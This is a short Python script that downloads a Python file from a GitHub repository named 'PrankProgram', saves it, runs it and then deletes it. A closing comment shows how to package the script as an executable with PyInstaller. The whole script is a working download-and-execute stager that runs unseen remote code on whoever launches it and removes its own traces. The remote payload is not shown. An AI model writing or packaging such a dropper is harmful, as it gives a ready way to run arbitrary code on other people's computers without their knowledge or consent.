
import requests, os, subprocess


# downloads raw git file as text and execute
try:
    file_text = requests.get("https://raw.githubusercontent.com/GummyC/PrankProgram/refs/heads/main/main.py").text
      
    with open("Custom_Script.py","w") as s:
        s.write(file_text)
    
    subprocess.run(["python", "Custom_Script.py"])

    os.remove("Custom_Script.py")
    
except Exception as e:
    print(e)

# py -m PyInstaller myfile.py